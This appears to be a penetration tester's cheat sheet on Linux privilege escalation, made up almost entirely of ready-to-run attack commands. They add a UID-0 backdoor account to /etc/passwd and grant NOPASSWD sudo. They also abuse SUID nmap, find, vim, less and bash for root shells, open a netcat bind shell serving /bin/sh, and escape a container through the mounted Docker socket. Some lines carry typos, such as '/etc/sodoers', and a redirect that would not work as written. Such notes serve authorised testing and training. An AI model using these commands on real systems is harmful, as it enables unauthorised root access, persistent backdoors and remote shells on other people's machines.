# Linux Privilege Escalation


#### Check Sudo Access  
`sudo -l`

#### Check for writable "system" files or paths?
```
/etc/passwd
/etc/shadow
/etc/crontab
```
## Modifying /etc/password | /etc/shadow
#### Creating password hashes for /etc/passwd  or /etc/shadow
 
  ```
  openssl passwd -6 -salt xyz  yourpass
  -1 MD5
  -5 SHA256
  -6 SHA512
  ```  
#### Sample root2:testing user for /etc/passwd
  ```
  root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash
  ```
#### Adding user to suoders file
```
user     ALL=(ALL:ALL) NOPASSWD:ALL
``` 
## SUID Based Privilge Escalation  
#### Locating SUIDS
`find . -perm /4000 2>/dev/null`  
`find / -user root -perm -4000 -print 2>/dev/null`  
`find / -perm -u=s -type f 2>/dev/null`  
`find / -user root -perm -4000 -exec ls -ldb {} \;`  

#### Exploiting SUIDs

nmap 2.02 - 5.21  
`nmap -V #version check`  

```
nmap --interactive  
nmap> !sh
```

find  
`find <file> -exec <CMD> \;`  
Escalation to root shell  
`find . -exec /bin/sh -p \; -quit`  
`find somefile -exec netcat -lvp 5555 -e /bin/sh \;`  
`find somefile -exec echo "lowprivuser ALL=(ALL) NOPASSWD:ALL" > /etc/sodoers \;`  
Vim  
```
vim /etc/shadow  
vim  
# Press ESC key  
:set shell=/bin/sh  
:shell
```

bash  
`bash -p`

less  
```
less /etc/passwd  
!/bin/sh
```
**Command reference for privilege escalation using SUIDS and SUDO**  
https://gtfobins.github.io/



## Processes running as root
```
ps aux | grep root
```
[pspy](https://github.com/DominicBreuker/pspy) may also be used to watch system processes interaction in realtime (including command lines).

## Kernel Exploits  
https://github.com/lucyoa/kernel-exploits

## Docker
If the docker socket is mounted from inside the dock container, you can eleveate to root.

The sock file is generally located in `/run/docker.sock`  or you can search `find / -name docker.sock 2>/dev/null`  

`docker run -it -v /:/host/ <available container images> chroot /host/ bash`  


